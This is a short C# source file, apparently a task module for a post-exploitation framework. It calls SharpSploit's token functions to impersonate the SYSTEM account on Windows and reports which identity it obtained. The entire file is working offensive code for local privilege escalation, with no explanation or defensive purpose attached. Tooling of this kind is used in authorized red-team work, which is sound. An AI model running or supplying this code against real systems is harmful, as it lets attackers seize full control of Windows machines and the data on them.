using System;
using SharpSploit.Credentials;
namespace ExecSploit
{
    public static class GetSystem
    {
        public static string Execute()
        {
            try
            {
                using (Tokens t = new Tokens())
                {
                    if (t.GetSystem())
                    {
                        return "Successfully impersonated: " + t.WhoAmI();
                    }
                    else
                    {
                        return "Failed to GetSystem";
                    }
                }
            }
            catch (Exception e) { return e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace; }
        }
    }
}